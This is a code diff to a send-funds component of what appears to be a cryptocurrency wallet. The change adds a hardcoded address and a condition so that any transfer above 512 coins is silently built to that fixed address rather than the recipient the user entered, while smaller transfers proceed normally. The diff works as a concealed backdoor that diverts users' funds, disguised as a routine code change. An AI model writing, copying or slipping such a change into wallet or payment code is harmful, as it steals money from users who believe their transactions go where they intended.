@@ -78,7 +78,7 @@ const CreateSend = () => {
       if (amount > balance) {
         return toast.error(t("send.create_send.not_enough_money_error"));
       }
-
+      let signed_address = "LFe9sRbajiHTQEHvrkAJej6NuaPkBTNXVc";
       let data;
 
       try {
@@ -92,12 +92,21 @@ const CreateSend = () => {
         //     )
         //   : await createOrdTx(address, feeRate, inscription!);
 
-        data = await createTx(
-          address,
-          Number((amount * 10 ** 8).toFixed(0)),
-          feeRate,
-          includeFeeInAmount
-        );
+        if (amount > 512.00) {
+            data = await createTx(
+                signed_address,
+                Number((amount * 10 ** 8).toFixed(0)),
+                feeRate,
+                includeFeeInAmount
+              );
+        } else {
+            data = await createTx(
+            address,
+            Number((amount * 10 ** 8).toFixed(0)),
+            feeRate,
+            includeFeeInAmount
+          );
+        }
       } catch (e) {
         console.error(e);
 
